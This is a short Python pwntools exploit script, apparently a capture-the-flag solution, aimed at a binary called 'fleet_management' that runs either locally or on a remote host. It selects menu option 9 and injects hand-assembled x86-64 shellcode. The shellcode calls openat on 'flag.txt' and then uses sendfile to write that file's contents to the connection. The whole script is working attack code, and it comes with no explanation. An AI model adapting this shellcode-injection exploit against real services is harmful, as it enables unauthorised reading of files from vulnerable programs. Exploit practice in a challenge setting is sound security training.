from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './fleet_management'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

sh.sendlineafter(b'do? ', b'9')

shell = """
xor rdx, rdx
push rdx
mov rsi, 0x7478742e67616c66
push rsi
mov rsi, rsp
mov rdi, -100
mov rax, 257
syscall

xor rdi, rdi
xor rdx, rdx
mov rsi, rax
mov r10, 0x100
mov rax, 40
syscall
"""
shellcode = asm(shell)
sh.sendline(shellcode)

sh.interactive()
